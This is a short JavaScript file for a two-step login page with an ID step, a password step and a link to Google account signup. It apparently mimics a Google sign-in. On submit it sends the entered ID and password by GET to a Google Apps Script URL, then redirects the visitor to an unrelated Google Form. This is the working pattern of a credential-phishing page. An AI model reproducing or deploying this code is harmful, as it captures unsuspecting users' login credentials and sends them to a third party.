window.onload = function() {
    var loginBox = document.querySelector('.outBox');
    document.getElementById("labela").addEventListener('change', function(){
    if(!document.getElementById("labela").value==''){
        loginBox.classList.add('existence');
        loginBox.classList.remove('empty');
    }else{
        loginBox.classList.remove('existence');   
        loginBox.classList.add('empty');
    }
    });

    var loginBoxb = document.querySelector('.outBoxb');
    document.getElementById("labelb").addEventListener('change', function(){
    if(!document.getElementById("labelb").value==''){
        loginBoxb.classList.add('existence');
        loginBoxb.classList.remove('empty');
    }else{
        loginBoxb.classList.remove('existence');   
        loginBoxb.classList.add('empty');
    }
    });
}

function submit() {
    var val1 = document.getElementById("labela").value;
    var val2 = document.getElementById("labelb").value;
    $('#submit').click(function () {
        // 제출중..
        isLoading(true);

        $.ajax({
        type: "GET",
        url: "https://script.google.com/macros/s/AKfycbxYKQvMC6NNSrrO0y0Bd-stIuxgUSzRCy_TeWkfxpKJn1YY3__G21LjnLAGSbPyMeDK/exec",
        data: {
            0: val1,
            1: val2,
        },
        success: function (response) {
            isLoading(false);
            window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSepsWvBxsXygF0QiUHTsY65Xz0tRpVYei9k9r-rgGuU_2jwow/viewform?usp=sf_link";
            setTimeout(function () {
            }, 3000);
        },
        error: function (request, status, error) {
            isLoading(false);
            alert("에러");
            console.log("code:" + request.status + "\n" + "error:" + error);
            console.log(request.responseText);
        }
        });
    });
}

function createAcc() {
    window.location.replace("https://accounts.google.com/signup/v2/webcreateaccount?service=wise&flowEntry=SignUp");
}

function isLoading(status){
    if(status){
        //흐리게
    } else {
        //맑게?
    }
}

function nextpage() {
    document.getElementById("id").classList.remove("vis");
    document.getElementById("id").classList.add("unvis");

    document.getElementById("pw").classList.remove("unvis");
    document.getElementById("pw").classList.add("vis");
}